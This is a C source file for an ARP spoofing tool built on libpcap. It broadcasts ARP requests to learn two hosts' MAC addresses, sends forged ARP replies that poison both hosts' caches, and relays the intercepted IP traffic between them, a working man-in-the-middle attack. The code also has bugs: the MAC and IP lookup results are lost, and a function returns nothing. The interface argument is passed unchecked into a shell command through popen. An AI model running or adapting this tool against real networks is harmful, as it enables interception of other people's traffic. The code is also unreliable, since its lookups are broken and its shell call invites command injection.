#include <net/ethernet.h>
#include <net/if_arp.h> //header
#include <netinet/ether.h> // ether_aton_r()
#include <pcap.h>  //pcap()
#include <unistd.h> //uint
#include <string.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h> //exit()
#include <stdint.h>


#define Bufsize 0xFFFF

#pragma pack(push,1)
typedef struct {
    struct ether_header ether;
    struct arphdr arp;
    uint8_t SenHardAdd[6];
    uint32_t SenIP;
    uint8_t TarHardAdd[6];
    uint32_t TarIP;

}ARP_packet;
#pragma pack(pop)

typedef struct  {
    uint8_t IHL : 4;
    uint8_t Version : 4;
    uint8_t TOS;
    unsigned short TotalLen;
    unsigned short Identifi;
    uint8_t Flagsx : 1;
    uint8_t FlagsD : 1;
    uint8_t FlagsM : 1;
    uint8_t FO1 : 5;
    uint8_t FO2;
    uint8_t TTL;
    uint8_t Protocol;
    uint16_t HeaderCheck;
    struct in_addr SrcAdd;
    struct in_addr DstAdd;
}IPH;


uint8_t sendermac[6];
uint8_t targetmac[6];
uint8_t MyMac[6];
uint32_t MyIp;

void dump(u_char const *data, uint32_t size){
    for(int i=0; i<size; i++) {
        if(i && i%16==0) puts("");
        printf("%02X ", data[i]);
    }
    puts("");
}

int get_mac(char *dev, struct ether_addr my_mac){
    FILE* ptr;
    char cmd[300] = {0x0};
    char Mac[20] = {0x0};
    sprintf(cmd,"ifconfig %s | grep HWaddr | awk '{print $5}'",dev);
    ptr = popen(cmd,"r");
    fgets(Mac,sizeof(Mac),ptr);
    pclose(ptr);
    ether_aton_r(Mac,&my_mac);

    return 0;
}

int get_ip(char *dev, struct sockaddr_in my_ip){
    FILE* ptr;
    char cmd[300] = {0x0};
    char ip[21] = {0,};
    sprintf(cmd,"ifconfig %s | egrep 'inet addr:' | awk '{print $2}'",dev);
    ptr = popen(cmd,"r");
    fgets(ip,sizeof(ip),ptr);
    pclose(ptr);
    inet_aton(ip+5,&my_ip.sin_addr);
}

int Brodcast_packet(ARP_packet *pub_P){
    int i;

    for(i=0; i<6; i++) pub_P ->ether.ether_dhost[i] = 0xff;
    for(i=0; i<6; i++) pub_P ->ether.ether_shost[i] = MyMac[i];
    pub_P ->ether.ether_type = htons(0x0806);
    pub_P ->arp.ar_hrd = htons(0x0001);
    pub_P ->arp.ar_pro = htons(0x0800);
    pub_P ->arp.ar_hln = 0x06;
    pub_P ->arp.ar_pln = 0x04;
    pub_P ->arp.ar_op = htons(0x0001);
    for(i=0; i<6; i++) pub_P->SenHardAdd[i] = MyMac[i];
    pub_P ->SenIP = MyIp;
    for(i=0; i<6; i++) pub_P ->TarHardAdd[i] = 0x00;
}

int Attack_packet(ARP_packet *pub_P){
    int i;

    for(i=0; i<6; i++) pub_P ->ether.ether_shost[i] =MyMac[i];
    pub_P ->ether.ether_type = htons(0x0806);
    pub_P ->arp.ar_hrd = htons(0x0001);
    pub_P ->arp.ar_pro = htons(0x0800);
    pub_P ->arp.ar_hln = 0x06;
    pub_P ->arp.ar_pln = 0x04;
    pub_P->arp.ar_op = htons(0x0002);
    for(i=0; i<6; i++) pub_P->SenHardAdd[i] = MyMac[i];
}

void Print_packet(ARP_packet *packet){
    int i;
    char packet_arr[42];

    memcpy(packet_arr, packet, sizeof(packet));
    printf(" Look your packet : ");
    for(i =0; i<42; i++) printf(" %02x ", packet_arr[i]);
    printf("\n");
}

int  Send_Brod_packet(pcap_t *handle, uint32_t send_ip, uint32_t tar_ip){
    ARP_packet packet1, packet2;

    Brodcast_packet(&packet1);
     Brodcast_packet(&packet2);
    packet1.TarIP = send_ip;
    packet2.TarIP = tar_ip;

    if(pcap_sendpacket(handle,(u_char *)&packet1,sizeof(packet1)) == -1){
        printf("Send packet for Brodcast sender \n");
        Print_packet(&packet1);
        exit(1);
    }
    if(pcap_sendpacket(handle,(u_char *)&packet2,sizeof(packet2)) == -1){
        printf("Send packet for Brodcast Target \n");
        Print_packet(&packet2);
        exit(1);
    }
}

int Send_Attack_packet(const u_char *packet, uint32_t send_ip, uint32_t tar_ip, pcap_t *handle){
    ARP_packet s_packet1, s_packet2;

    Attack_packet(&s_packet1);
    Attack_packet(&s_packet2);

        for(int i =0; i<6; i++) s_packet1.ether.ether_dhost[i] = sendermac[i];
        s_packet1.SenIP = tar_ip;
        for(int i =0; i<6; i++) s_packet1.TarHardAdd[i] = sendermac[i];
        s_packet1.TarIP = send_ip;

        if(pcap_sendpacket(handle, (u_char *)&s_packet1, sizeof(s_packet1)) == -1){
            printf("Send Attack packet to sander\n");
            Print_packet(&s_packet1);
            exit(1);
        }
        for(int i =0; i<6; i++) s_packet2.ether.ether_dhost[i] = targetmac[i];
        s_packet2.SenIP = send_ip;
        for(int i =0; i<6; i++) s_packet2.TarHardAdd[i] = targetmac[i];
        s_packet2.TarIP = tar_ip;

        if(pcap_sendpacket(handle, (u_char *)&s_packet2, sizeof(s_packet2)) == -1){
            printf("Send Attack packet to target \n");
            Print_packet(&s_packet2);
            exit(1);
         }
}

int Get_target_mac(const u_char *packet, uint32_t send_ip, uint32_t tar_ip, pcap_t *handle){
    ARP_packet *colander = (ARP_packet *)packet;
    ARP_packet s_packet;
    Attack_packet(&s_packet);

    if(colander->SenIP == send_ip){
        for(int i =0; i<6; i++) sendermac[i] = colander->ether.ether_shost[i];
        for(int i =0; i<6; i++) s_packet.ether.ether_dhost[i] = sendermac[i];
        s_packet.SenIP = tar_ip;
        for(int i =0; i<6; i++) s_packet.TarHardAdd[i] = sendermac[i];
        s_packet.TarIP = send_ip;

        if(pcap_sendpacket(handle, (u_char *)&s_packet, sizeof(s_packet)) == -1){
            printf("Send Attack packet to sander\n");
            Print_packet(&s_packet);
            exit(1);
        }
    }
    if(colander->SenIP == tar_ip){
        for(int i =0; i<6; i++) targetmac[i] = colander->ether.ether_shost[i];
        for(int i =0; i<6; i++) s_packet.ether.ether_dhost[i] = targetmac[i];
        s_packet.SenIP = send_ip;
        for(int i =0; i<6; i++) s_packet.TarHardAdd[i] = targetmac[i];
        s_packet.TarIP = tar_ip;

        if(pcap_sendpacket(handle, (u_char *)&s_packet, sizeof(s_packet)) == -1){
            printf("Send Attack packet to target \n");
            Print_packet(&s_packet);
            exit(1);
        }}}

int Relay_packet(pcap_t *handle,const u_char *packet, uint32_t send_ip, uint32_t tar_ip, struct pcap_pkthdr *header){
    struct ether_header *etherh = (struct ether_header *)packet;
    IPH *iph = (IPH *)(packet + 14);
    u_char arr[header->caplen];
    uint32_t ip;

    memcpy(&ip, &iph->DstAdd, sizeof(iph->SrcAdd));

    if((memcmp(etherh->ether_shost, sendermac, 6) == 0) && (memcmp(etherh->ether_dhost, MyMac,6) == 0)){
       if( ntohl(ip) != MyIp){
        for(int i =0; i<6; i++) arr[i] = targetmac[i];
        for(int i =6; i<12; i++) arr[i] = MyMac[i-6];
        memcpy((arr + 12), (packet+12), (header->caplen-12));

        if(pcap_sendpacket(handle, arr,  header->caplen) == -1){
            printf("relay to target error! \n ");
            printf("\nPacket : \n");
            dump(arr, sizeof(arr));
            exit(1);
       }}}

    if((memcmp(etherh->ether_shost, targetmac, 6) == 0) && (memcmp(etherh->ether_dhost, MyMac,6) == 0)){
       if(ntohl(ip) != MyIp){
         for(int i =0; i<6; i++) arr[i] = sendermac[i];
         for(int i =6; i<12; i++)  arr[i] = MyMac[i-6];
         memcpy((arr + 12), (packet+12), (header->caplen -12));

         if(pcap_sendpacket(handle, arr,  header->caplen) == -1){
            printf("relay to send error!\n ");
            printf("\nPacket : \n");
            dump(arr, sizeof(arr));
            exit(1);
        }
    }}}

int main(int argc,char *argv[]){
    if( argc != 4){
        printf("That 's wrong!\n");
        printf("EX)./send_arp (interface) (senderIP) (targetIP) \n");
        exit(1);
    }

    char *dev = argv[1];
    char errorbuf[PCAP_ERRBUF_SIZE];
    const u_char *packet;
    struct ether_addr my_mac;
    struct sockaddr_in my_ip;
    struct sockaddr_in sender_ip;
    struct sockaddr_in target_ip;
    struct pcap_pkthdr *header;
    uint32_t send_ip;
    uint32_t tar_ip;
    uint8_t zero[6] = {0};

    inet_aton(argv[2], &sender_ip.sin_addr);
    memcpy(&send_ip, &sender_ip.sin_addr, sizeof(sender_ip.sin_addr));
    inet_aton(argv[3], &target_ip.sin_addr);
    memcpy(&tar_ip, &target_ip.sin_addr, sizeof(target_ip.sin_addr));

    pcap_t *handle = pcap_open_live(dev, Bufsize, 1, 1, errorbuf);
    if (handle == NULL){
        printf("pcap_open error :  %s \n", errorbuf );
        exit(1);
    }

    get_mac(dev, my_mac);
    memcpy(&MyMac,&my_mac.ether_addr_octet,6);

    if (get_ip(dev, my_ip) < 0){
        printf("fail get ip \n");
        exit(1);
    }
    if (get_ip(dev, my_ip) > 0) memcpy(&MyIp, &my_ip.sin_addr, sizeof(my_ip.sin_addr));

    Send_Brod_packet(handle, send_ip, tar_ip);

    while (1) {
        int next = pcap_next_ex(handle, &header, &packet);
        if(next == 0) continue;
        if(next == -1 || next == -2){
            printf("pcap next error or EOF \n");
            exit(1);
        }
        ARP_packet *pkt = (ARP_packet *)packet;

        if( ntohs(pkt->ether.ether_type) == 0x0806) {
            if(ntohs(pkt->arp.ar_op) == 0x0002 && pkt->TarIP == MyIp) Get_target_mac(packet, send_ip, tar_ip, handle);
            if(ntohs(pkt->arp.ar_op) == 0x0001){
                Send_Attack_packet(packet, send_ip, tar_ip, handle);
            } }
        if(memcmp(sendermac, zero, 6) == 0 || memcmp(targetmac, zero, 6) == 0) Send_Brod_packet(handle, send_ip, tar_ip);
        if( ntohs(pkt->ether.ether_type) == 0x0800)  Relay_packet(handle, packet, send_ip, tar_ip, header);
    }

}

